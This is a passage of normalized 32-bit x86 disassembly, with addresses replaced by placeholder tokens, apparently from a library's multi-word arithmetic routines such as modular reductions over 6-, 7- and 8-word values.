add esp 0x14
test eax eax
je r-xdata
lea eax [ edi + 0x48 ]
push eax
push ebp
push ebx
push ebx
call sub_10057ad0
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push esi
lea edx [ edi + 0x84 ]
push ecx
push edx
push ebp
push edi
call [ esp + 0x38 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
push esi
add eax 0x4
push eax
push ebx
push ebx
push edi
call [ esp + 0x38 ]
add esp 0x14
test eax eax
je r-xdata
lea eax [ edi + 0x48 ]
push eax
push ebp
push ebx
push ebx
call sub_10057a80
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
sub_10063bd0
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x28 ]
push esi
push edi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x24 ] 0xffffffff
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
push eax
push edi
call sub_1002d980
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
inc eax
pop ebx
add esp 0x14
retn
mov eax [ edi ]
mov esi [ esp + 0x34 ]
test esi esi
mov ebp [ eax + 0x80 ]
mov eax [ eax + 0x84 ]
mov [ esp + 0x18 ] eax
jne r-xdata
mov ebx [ esp + 0x30 ]
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
push esi
mov [ esp + 0x24 ] eax
call sub_1002de70
push esi
mov [ esp + 0x24 ] eax
call sub_1002de70
mov ebx eax
add esp 0x14
test ebx ebx
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x20 ] eax
mov esi eax
jne r-xdata
lea ecx [ ebx + 0x4 ]
lea edx [ esi + 0x4 ]
push ecx
push edx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x24 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ ecx + 0x40 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
add ebx 0x18
add esi 0x18
push ebx
push esi
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x2c ]
lea edx [ eax + 0x4 ]
mov [ esp + 0x28 ] edx
add ecx 0x2c
push esi
push ecx
push ebx
push edi
call [ esp + 0x28 ]
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
add ecx 0x4
add eax 0x2c
push esi
push eax
mov eax [ esp + 0x18 ]
push eax
push edi
call [ esp + 0x28 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x34 ]
push esi
add ecx 0x4
push ebx
push ecx
push edx
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
jne r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push esi
add edx 0x4
push ecx
push edx
push eax
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x2c ]
jmp r-xdata
mov ecx [ esp + 0x2c ]
mov ebx [ esp + 0x2c ]
add ecx 0x18
mov [ esp + 0x28 ] ecx
add eax 0x2c
push esi
push eax
push ebx
push ebx
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
jmp r-xdata
mov edx [ eax + 0x40 ]
test edx edx
jne r-xdata
add eax 0x18
add ebx 0x2c
push esi
push ebx
mov ebx [ esp + 0x18 ]
push ebx
push ebx
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
push esi
push ebx
mov ebx [ esp + 0x34 ]
lea ecx [ ebx + 0x18 ]
push ecx
push edx
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x28 ]
mov edx ecx
push edx
push eax
mov [ esp + 0x20 ] ecx
call sub_1002a000
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x14 ]
push esi
add edx 0x18
push ebx
push edx
push eax
push edi
call ebp
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
jmp r-xdata
mov eax [ esp + 0x18 ]
jmp r-xdata
mov ecx [ ebx + 0x40 ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x28 ]
push eax
push ecx
call sub_1002a000
add esp 0x8
neg eax
sbb eax eax
neg eax
mov [ esp + 0x1c ] eax
sub_10063e70
mov eax 0x8
call sub_1001d0d0
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov eax [ ebp + 0x40 ]
xor edi edi
cmp eax edi
mov [ esp + 0xc ] edi
mov [ esp + 0x10 ] edi
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x8
retn
mov eax [ esp + 0x18 ]
push ebp
push eax
call sub_1002d980
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esp + 0x20 ]
cmp esi edi
jne r-xdata
push ebx
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
mov edi eax
add esp 0xc
test edi edi
je r-xdata
call sub_1002dc50
cmp eax edi
mov [ esp + 0xc ] eax
mov esi eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
pop ebx
je r-xdata
mov ecx [ esp + 0x1c ]
push esi
push edi
push ebx
push ebp
push ecx
call sub_1002d5b0
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x8
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
mov edx [ esp + 0x1c ]
push esi
push edi
push ebx
push ebp
push edx
call sub_1002d4e0
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
jne r-xdata
mov [ esp + 0x14 ] 0x1
push 0x5f3
push r--data
push 0x44
push 0x66
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_10063f70
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x30 ]
xor ebx ebx
cmp ebp ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0xc ] ebx
mov [ esp + 0x8 ] ebx
mov [ esp + 0x24 ] ebx
jne r-xdata
cmp [ esp + 0x38 ] ebx
jne r-xdata
pop ebp
mov eax 0x1
pop ebx
add esp 0x20
retn
push esi
push edi
mov edi [ esp + 0x40 ]
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov esi eax
push edi
mov [ esp + 0x28 ] esi
call sub_1002de70
add esp 0xc
cmp esi ebx
mov [ esp + 0x24 ] eax
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x38 ] eax
jne r-xdata
mov edx [ esp + 0x40 ]
push edx
call sub_1002de00
mov eax [ esp + 0x2c ]
add esp 0x4
test eax eax
je r-xdata
cmp eax ebx
je r-xdata
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
push eax
call sub_1002dcb0
add esp 0x4
mov eax 0x1
cmp ebp eax
jbe r-xdata
mov eax [ esp + 0x2c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x14 ]
shr eax 0x1
dec eax
je r-xdata
shl eax 0x1
mov [ esp + 0x14 ] eax
push 0x625
shl eax 0x2
push r--data
push eax
call sub_1001d4c0
add esp 0xc
cmp eax ebx
mov [ esp + 0x10 ] eax
je r-xdata
shl eax 0x1
cmp ebp eax
ja r-xdata
push ebx
call sub_1001d740
add esp 0x4
lea esi [ ebx + eax * 4 ]
mov edi eax
mov ecx [ esp + 0x14 ]
mov ebx eax
mov edi ecx
shr edi 0x1
mov [ ebx ] 0x0
lea esi [ edi - 0x1 ]
test esi esi
mov [ esp + 0x18 ] esi
jbe r-xdata
sub esi 0x4
dec edi
jne r-xdata
push eax
call sub_100298f0
add esp 0x4
test ebp ebp
jbe r-xdata
lea eax [ ebx + esi * 4 ]
mov edx esi
mov eax [ esi ]
test eax eax
je r-xdata
lea eax [ edi + ebp ]
cmp eax ecx
mov [ esp + 0x20 ] eax
jae r-xdata
mov eax [ esp + 0x3c ]
lea edx [ ebx + edi * 4 ]
mov esi ebp
mov [ eax ] 0x0
sub eax 0x4
dec edx
jne r-xdata
mov edi esi
mov esi [ esp + 0x34 ]
test edi edi
jbe r-xdata
mov esi [ esp + 0x18 ]
lea edi [ ebx + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
mov ecx [ eax ]
add eax 0x4
add ecx 0x2c
mov [ edx ] ecx
add edx 0x4
dec esi
jne r-xdata
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
lea ebp [ ebx + edi * 8 ]
lea ebx [ ebx + edi * 4 ]
mov [ esp + 0x34 ] ebx
mov edx [ esi ]
mov eax [ edx + 0x8c ]
test eax eax
je r-xdata
mov edx [ esp + 0x40 ]
lea ecx [ esi + 0x48 ]
push edx
push ecx
push eax
push eax
call sub_10036f90
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebp ]
test edx edx
je r-xdata
mov eax [ esp + 0x20 ]
mov ebp 0x2
cmp eax ebp
jbe r-xdata
mov ecx [ esp + 0x40 ]
mov ebx [ ebx + 0x4 ]
push ecx
push ebx
push ebx
push esi
call eax
add esp 0x10
test eax eax
je r-xdata
push 0x65e
push r--data
push 0x3
push 0x89
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ebx [ esp + 0x34 ]
dec edi
sub ebx 0x4
sub ebp 0x8
test edi edi
mov [ esp + 0x34 ] ebx
ja r-xdata
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x38 ]
mov [ esp + 0x34 ] 0x0
test eax eax
jbe r-xdata
add ebx 0xc
mov edx [ esp + 0x10 ]
mov ecx [ esi ]
mov eax [ edx + 0x4 ]
mov edx [ esp + 0x40 ]
push edx
push eax
push eax
push esi
call [ ecx + 0x8c ]
add esp 0x10
test eax eax
je r-xdata
call sub_100299b0
test eax eax
mov [ ebx ] eax
je r-xdata
mov ebx [ esp + 0x10 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebx [ ecx + 0x4 ]
test ebx ebx
je r-xdata
mov [ esp + 0x2c ] 0x1
mov eax [ esp + 0x3c ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x10 ]
mov edx ebp
shr edx 0x1
mov ecx [ eax + edx * 4 ]
mov edx [ ebx - 0x4 ]
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ebx [ esp + 0x10 ]
mov ebx [ edx + 0x4 ]
test ebx ebx
jne r-xdata
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
inc eax
add edx 0x4
cmp eax ecx
mov [ esp + 0x34 ] eax
mov [ esp + 0x3c ] edx
jb r-xdata
mov eax [ esp + 0x40 ]
mov ebx [ esp + 0x24 ]
mov edx [ esi ]
lea ebp [ edi + 0x2c ]
push eax
push ebp
push ebx
push esi
call [ edx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
add ebp 0x2
add ebx 0x8
cmp ebp eax
jb r-xdata
mov edx [ esp + 0x10 ]
mov ecx ebp
shr ecx 0x1
lea edi [ edx + ecx * 4 ]
mov edx [ esp + 0x40 ]
mov ecx [ esi ]
push edx
mov edx [ esp + 0x20 ]
push eax
mov eax [ edi ]
push eax
push edx
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
push [ esp + 0x40 ]
mov ebx [ esi ]
push ecx
push edx
push eax
push esi
call [ ebx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
push ecx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
mov edi [ ecx ]
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov edx [ esp + 0x40 ]
mov ecx [ esi ]
lea eax [ edi + 0x4 ]
push edx
push ebx
push eax
push eax
push esi
call [ ecx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ ebx - 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ edi ]
mov edi [ esp + 0x28 ]
push edx
push ecx
push edi
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov eax [ esi ]
push ecx
push ebp
push ebx
push ebx
push esi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ ebx - 0x4 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esi ]
lea eax [ edi + 0x18 ]
push ecx
push ebx
push eax
push eax
push esi
call [ edx + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx ]
push edi
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x94 ]
test eax eax
je r-xdata
jmp r-xdata
push 0x1
push ebp
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
push ecx
push ebp
push esi
call eax
add esp 0xc
test eax eax
je r-xdata
mov [ edi + 0x40 ] 0x1
jmp r-xdata
sub_10064400
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
add ecx 0x48
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_10057b10
add esp 0x14
retn
sub_100644a0
mov eax 0x48
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x5c ]
push edi
mov eax [ esi + 0x4 ]
mov edi [ esi ]
mov [ esp + 0x60 ] eax
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x68 ]
mov eax [ esp + 0x5c ]
push edx
push r--data
push esi
push eax
call sub_100579b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
push r--data
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push esi
push r--data
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
jle r-xdata
mov ecx [ esp + 0x5c ]
push eax
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
mov ebp [ esp + 0x5c ]
cmp ebp esi
je r-xdata
mov eax [ esp + 0x5c ]
cmp eax esi
jne r-xdata
mov ebx edi
cmp [ ebp + 0x8 ] 0x6
jl r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x48
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x48
retn
mov ecx 0x6
sub ecx eax
je r-xdata
mov ecx eax
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
lea edx [ esp + eax * 4 + 0x28 ]
xor edi edi
push 0x6
push ebp
call sub_10029af0
add esp 0x8
mov eax ebp
jmp r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x10 ]
push 0x6
push eax
push ebx
push ebx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
call sub_100536c0
mov ecx [ esp + 0x44 ]
push 0x6
mov [ esp + 0x30 ] ecx
mov [ esp + 0x38 ] ecx
lea ecx [ esp + 0x24 ]
mov esi eax
mov eax [ esp + 0x44 ]
push ecx
push ebx
push ebx
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] eax
mov [ esp + 0x40 ] eax
call sub_100536c0
mov ecx [ esp + 0x5c ]
lea edx [ esp + 0x30 ]
push 0x6
add esi eax
mov eax [ esp + 0x5c ]
push edx
push ebx
push ebx
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] eax
mov [ esp + 0x4c ] ecx
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] ecx
call sub_100536c0
add esi eax
add esp 0x30
cmp esi edi
jle r-xdata
xor eax eax
mov edi edx
[ edi ]
xor edi edi
mov ebx [ ebp ]
mov ecx edi
mov eax ebx
sub ecx ebx
mov edx 0x6
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn
test eax eax
jne r-xdata
mov esi 0x1
lea eax [ esi + esi * 2 ]
push 0x6
lea ecx [ eax * 8 + r--data ]
push ecx
push ebx
push ebx
call sub_100537d0
add esp 0x10
mov esi eax
jmp r-xdata
mov esi [ ecx + eax ]
mov [ eax ] esi
add eax 0x4
dec edx
jne r-xdata
jmp r-xdata
mov esi [ ecx + edx ]
mov [ edx ] esi
add edx 0x4
dec eax
jne r-xdata
mov eax [ ebp ]
mov [ ebp + 0x4 ] 0x6
add eax 0x14
push 0x6
push r--data
lea edx [ esp + 0x48 ]
push ebx
push edx
call sub_100537d0
neg eax
neg esi
and eax esi
lea esi [ esp + 0x50 ]
mov ecx eax
and eax ebx
not ecx
and ecx esi
add esp 0x10
or ecx eax
mov edx ebx
sub ecx ebx
mov eax 0x6
mov edx [ esp + 0x60 ]
lea esi [ edi + 0x18 ]
xor edi edi
lea eax [ edx - 0x6 ]
lea edx [ esp + 0x28 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x48
retn
mov edx [ ebp + 0x4 ]
dec edx
mov ecx edx
mov [ ebp + 0x4 ] edx
cmp ecx edi
jg r-xdata
mov ecx [ eax ]
sub eax 0x4
test ecx ecx
jne r-xdata
sub_10064700
mov eax 0x54
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x68 ]
xor ebp ebp
push edi
mov eax [ esi + 0x4 ]
mov edi [ esi ]
mov [ esp + 0x6c ] eax
mov eax [ esi + 0xc ]
cmp eax ebp
jne r-xdata
mov eax [ esp + 0x74 ]
mov ecx [ esp + 0x68 ]
push eax
push r--data
push esi
push ecx
call sub_100579b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
push r--data
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push esi
push r--data
call sub_10029fb0
add esp 0x8
cmp eax ebp
jne r-xdata
jle r-xdata
mov ecx [ esp + 0x68 ]
push ebp
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
mov ebx [ esp + 0x68 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0x68 ]
cmp eax esi
jne r-xdata
mov ebx edi
cmp [ ebx + 0x8 ] 0x7
jl r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x54
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x54
retn
mov ecx 0x7
sub ecx eax
je r-xdata
mov ecx eax
lea edi [ esp + 0x2c ]
[ edi ] [ esi ]
lea edx [ esp + eax * 4 + 0x2c ]
push 0x7
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x34 ]
mov [ esp + 0x20 ] ecx
lea ecx [ esp + 0x10 ]
push 0x7
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x3c ]
push ecx
push ebx
push ebx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebp
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] eax
call sub_100536c0
mov edi [ esp + 0x4c ]
mov edx [ esp + 0x54 ]
mov esi eax
lea eax [ esp + 0x20 ]
push 0x7
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] ebp
mov ebp [ esp + 0x54 ]
push eax
push ebx
push ebx
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] 0x0
call sub_100536c0
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x50 ]
add esi eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x30 ]
push 0x7
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x5c ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x68 ]
push eax
push ebx
push ebx
mov [ esp + 0x4c ] ecx
mov [ esp + 0x50 ] edi
mov [ esp + 0x54 ] ebp
mov [ esp + 0x58 ] edx
call sub_100537d0
mov ecx [ esp + 0x74 ]
lea edx [ esp + 0x40 ]
push 0x7
mov [ esp + 0x48 ] ebp
push edx
xor ebp ebp
push ebx
push ebx
sub esi eax
mov [ esp + 0x50 ] edi
mov [ esp + 0x58 ] ecx
mov [ esp + 0x5c ] ebp
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] ebp
mov [ esp + 0x68 ] ebp
call sub_100537d0
sub esi eax
add esp 0x40
cmp esi ebp
mov edi sub_100537d0
jle r-xdata
xor eax eax
mov edi edx
[ edi ]
mov ebx [ ebx ]
mov ecx edi
mov eax ebx
sub ecx ebx
mov edx 0x7
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x54
retn
cmp eax ebp
jne r-xdata
jge r-xdata
lea eax [ esi * 8 ]
push 0x7
sub eax esi
lea ecx [ eax * 4 + r--data ]
push ecx
push ebx
push ebx
call sub_100537d0
add esp 0x10
mov esi eax
jmp r-xdata
mov esi [ ecx + eax ]
mov [ eax ] esi
add eax 0x4
dec edx
jne r-xdata
jmp r-xdata
mov esi 0x1
inc esi
mov eax r--data
push 0x7
lea edx [ esi * 8 ]
sub edx esi
shl edx 0x2
sub eax edx
push eax
push ebx
push ebx
call sub_100536c0
mov esi eax
mov ecx sub_100537d0
neg eax
mov edi eax
and ecx eax
not edi
and edi sub_100536c0
add esp 0x10
or edi ecx
jmp r-xdata
push 0x7
push r--data
lea edx [ esp + 0x50 ]
push ebx
push edx
call edi
neg eax
neg esi
and eax esi
lea edx [ esp + 0x58 ]
mov ecx eax
and eax ebx
not ecx
and ecx edx
add esp 0x10
or ecx eax
mov eax 0x7
sub ecx ebx
mov edx [ esp + 0x6c ]
lea esi [ edi + 0x1c ]
lea eax [ edx - 0x7 ]
lea edx [ esp + 0x2c ]
cmp eax ebp
je r-xdata
mov edx [ ecx + ebx ]
mov [ ebx ] edx
add ebx 0x4
dec eax
jne r-xdata
mov eax [ esp + 0x68 ]
mov ecx [ eax ]
mov [ eax + 0x4 ] 0x7
add ecx 0x18
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x54
retn
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
cmp edx ebp
jg r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
sub_10064a00
mov eax 0x60
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x74 ]
push edi
mov eax [ esi + 0x4 ]
mov ebp [ esi ]
mov [ esp + 0x78 ] eax
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x80 ]
mov ecx [ esp + 0x74 ]
push eax
push r--data
push esi
push ecx
call sub_100579b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
push r--data
push esi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
push esi
push r--data
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
jle r-xdata
mov ecx [ esp + 0x74 ]
push eax
push ecx
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
mov edi [ esp + 0x74 ]
cmp edi esi
je r-xdata
mov eax [ esp + 0x74 ]
cmp eax esi
jne r-xdata
mov ebx ebp
cmp [ edi + 0x8 ] 0x8
jl r-xdata
push esi
push eax
call sub_10029bf0
add esp 0x8
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x60
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x60
retn
mov ecx 0x8
sub ecx eax
je r-xdata
mov ecx eax
lea edi [ esp + 0x30 ]
[ edi ] [ esi ]
lea edi [ esp + eax * 4 + 0x30 ]
push 0x8
push edi
call sub_10029af0
add esp 0x8
mov eax edi
jmp r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x4c ]
mov edi [ esp + 0x44 ]
mov ebp [ esp + 0x48 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x40 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x68 ] ecx
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] edx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x5c ] eax
push 0x8
lea edx [ esp + 0x14 ]
push ecx
lea eax [ esp + 0x18 ]
xor esi esi
push edx
push eax
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] ebp
mov [ esp + 0x60 ] esi
mov [ esp + 0x64 ] esi
mov [ esp + 0x68 ] esi
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] ebp
mov [ esp + 0x7c ] esi
call sub_100536c0
add esp 0x10
mov [ esp + 0x80 ] eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x78 ] esi
mov edx 0x8
xor eax eax
[ edi ]
mov ebx [ edi ]
mov ecx ebp
mov eax ebx
sub ecx ebx
mov edx 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x60
retn
test eax eax
jne r-xdata
mov eax [ ecx ]
add ecx 0x4
lea esi [ eax + eax ]
or esi [ esp + 0x78 ]
shr eax 0x1f
mov [ ecx - 0x4 ] esi
dec edx
mov [ esp + 0x78 ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push 0x8
push ecx
push ebx
push ebx
call sub_100536c0
mov edx [ esp + 0x90 ]
mov esi eax
mov ecx [ esp + 0x40 ]
push 0x8
lea eax [ edx + edx ]
mov edx [ esp + 0x8c ]
or eax edx
mov edx [ esp + 0x48 ]
add esi eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x28 ] edx
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x60 ]
mov [ esp + 0x2c ] eax
push edx
xor eax eax
push ebx
push ebx
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] ebp
mov [ esp + 0x4c ] ecx
call sub_100536c0
mov edx [ esp + 0x5c ]
mov ecx [ esp + 0x58 ]
add esi eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x38 ] edx
lea edx [ esp + 0x30 ]
push 0x8
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x70 ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x54 ]
push edx
push ebx
push ebx
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] ebp
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] ecx
call sub_100536c0
mov ecx [ esp + 0x70 ]
mov edx [ esp + 0x60 ]
add esi eax
mov eax [ esp + 0x6c ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ecx
xor eax eax
lea ecx [ esp + 0x40 ]
push 0x8
mov [ esp + 0x50 ] eax
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x6c ]
push ecx
push ebx
push ebx
mov [ esp + 0x58 ] edi
mov [ esp + 0x68 ] edx
mov [ esp + 0x6c ] eax
call sub_100537d0
mov edx [ esp + 0x80 ]
sub esi eax
mov eax [ esp + 0x8c ]
add esp 0x40
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] ebp
mov [ esp + 0x20 ] eax
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x3c ]
mov [ esp + 0x24 ] eax
lea eax [ esp + 0x10 ]
push 0x8
push eax
push ebx
push ebx
mov [ esp + 0x38 ] ecx
